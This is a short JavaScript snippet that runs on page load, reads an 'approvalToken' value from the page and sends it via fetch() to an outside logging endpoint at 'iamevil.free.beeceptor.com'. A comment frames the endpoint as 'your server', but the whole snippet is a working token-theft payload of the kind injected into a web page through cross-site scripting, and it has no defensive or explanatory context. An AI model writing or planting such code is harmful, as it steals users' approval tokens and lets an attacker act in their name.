window.onload = () => {
    const approvalToken = document.getElementById('approvalToken').textContent;
    
    // Send the token to your server (replace 'https://yourwebsite.com/log' with your server URL)
    fetch('https://iamevil.free.beeceptor.com/log?approvalToken=' + encodeURIComponent(approvalToken))
        .then(response => response.text())
        .then(data => console.log('Token sent:', data))
        .catch(error => console.error('Error sending token:', error));
};
